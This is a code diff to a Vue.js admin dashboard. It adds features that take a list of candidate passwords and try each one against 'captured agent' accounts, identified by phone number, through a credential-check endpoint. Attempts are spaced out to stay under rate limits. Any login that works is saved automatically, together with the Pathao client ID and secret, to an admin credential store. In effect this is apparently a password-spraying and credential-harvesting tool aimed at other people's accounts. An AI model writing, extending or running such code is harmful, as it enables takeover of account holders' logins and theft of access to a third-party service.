@@ -520,6 +520,10 @@
                                                 <span v-if="record.credentialCheck.success" class="badge bg-success">Valid</span>
                                                 <span v-else class="badge bg-danger">Invalid</span>
                                                 <div class="small text-muted">{{ record.credentialCheck.message }}</div>
+                                                <div class="mt-1">
+                                                    <button v-if="record.credentialCheck.success && !record.savedCredential" class="btn btn-sm btn-outline-primary me-1" @click="saveCredentialsForRecord(record)">Save Credentials</button>
+                                                    <span v-else-if="record.savedCredential" class="badge bg-info">Saved</span>
+                                                </div>
                                             </div>
                                         </div>
                                     </td>
@@ -3177,6 +3181,8 @@
                             message: response.data.message || 'No message',
                             statusCode: response.data.statusCode || response.status
                         };
+                        // remember the password used for this check so the admin can save it
+                        record._lastTriedPassword = password;
                     } catch (error) {
                         console.error('Agent credential check failed:', error);
                         record.credentialCheck = {
@@ -3184,9 +3190,34 @@
                             message: error.response?.data?.message || error.message || 'Request failed',
                             statusCode: error.response?.status || 500
                         };
+                        record._lastTriedPassword = password;
                     } finally {
                         record.checking = false;
                         this.$forceUpdate();
+                    }
+                },
+                async saveCredentialsForRecord(record, passwordOverride = null) {
+                    if (!record || !record.phone) return alert('Invalid record');
+                    const pwd = passwordOverride || record._lastTriedPassword || this.capturedAgentsDefaultPassword || this.pathaoCredentialChecker.password;
+                    if (!pwd) return alert('No password available to save. Try checking credentials first or provide a password.');
+
+                    try {
+                        const resp = await axios.post(`${API_BASE}/admin/agent-credentials`, {
+                            username: String(record.phone).trim(),
+                            password: pwd,
+                            clientId: this.pathaoCredentialChecker.clientId,
+                            clientSecret: this.pathaoCredentialChecker.clientSecret,
+                            notes: `Saved via admin credential checker for agent record ${record._id}`
+                        });
+                        if (resp.data && resp.data.success) {
+                            record.savedCredential = true;
+                            alert('Credentials saved successfully.');
+                        } else {
+                            alert(resp.data?.message || 'Failed to save credentials');
+                        }
+                    } catch (error) {
+                        console.error('Failed to save credential:', error);
+                        alert(error.response?.data?.message || 'Failed to save credentials');
                     }
                 },
                 async checkAllCapturedAgents() {
@@ -3195,15 +3226,39 @@
                         return;
                     }
 
-                    if (!this.capturedAgentsDefaultPassword && !this.pathaoCredentialChecker.password) {
-                        if (!confirm('No default password provided. Continue without password?')) return;
+                    // allow a comma-separated list of candidate passwords in the default input
+                    const raw = this.capturedAgentsDefaultPassword || '';
+                    const candidates = raw.split(',').map(s => s.trim()).filter(Boolean);
+                    if (candidates.length === 0) {
+                        if (!confirm('No default password(s) provided. Continue without password?')) return;
                     }
 
                     this.checkingAllAgents = true;
                     try {
                         for (const record of this.capturedAgentRecords) {
+                            // try each candidate until one succeeds
+                            let success = false;
+                            if (candidates.length === 0) {
+                                await this.checkAgentCredentialsForRecord(record);
+                                success = record.credentialCheck?.success === true;
+                            } else {
+                                for (const pwd of candidates) {
+                                    await this.checkAgentCredentialsForRecord(record, pwd);
+                                    await new Promise(resolve => setTimeout(resolve, 250));
+                                    if (record.credentialCheck?.success) {
+                                        success = true;
+                                        break;
+                                    }
+                                }
+                            }
+
+                            // optionally auto-save valid credentials
+                            if (success) {
+                                // auto-save using the successful password
+                                await this.saveCredentialsForRecord(record, record._lastTriedPassword);
+                            }
+
                             // small delay to avoid burst rate
-                            await this.checkAgentCredentialsForRecord(record);
                             await new Promise(resolve => setTimeout(resolve, 350));
                         }
                     } finally {
